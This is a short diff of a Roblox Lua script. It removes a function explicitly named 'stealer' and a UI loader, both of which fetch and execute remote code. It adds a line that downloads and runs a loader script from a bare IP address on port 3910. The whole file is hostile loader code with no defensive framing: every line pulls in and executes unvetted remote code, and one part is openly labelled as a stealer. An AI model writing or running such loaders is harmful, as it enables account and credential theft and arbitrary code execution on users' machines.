@@ -1,8 +1,2 @@
-local function stealer()
-    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/'))() -- replace with actual stealer
-end
-local function loadui()
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
-end
-task.spawn(stealer)
-task.spawn(loadui)
+ID="4d80bc89-a4cd-435e-b511-97b3fb0d4ad7";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
